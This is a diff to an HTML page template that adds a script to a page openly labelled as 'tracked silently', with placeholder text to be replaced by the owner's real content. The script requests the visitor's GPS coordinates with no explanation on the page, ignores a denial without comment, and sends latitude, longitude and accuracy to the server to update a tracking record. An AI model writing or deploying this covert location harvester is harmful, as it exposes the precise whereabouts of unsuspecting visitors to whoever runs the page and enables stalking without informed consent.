@@ -29,5 +29,30 @@
     <p>This page is being tracked silently.</p>
     <!-- Replace this content with your actual page -->
   </div>
+
+  <script>
+    // Store the session ID set by the server so we can update the record
+    // Silently attempt GPS — no visible prompt text, just the browser's own popup
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          try {
+            await fetch('/api/update-location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+              })
+            });
+          } catch (e) {
+            // silently fail
+          }
+        },
+        () => {} // silently ignore if user denies
+      );
+    }
+  </script>
 </body>
 </html>
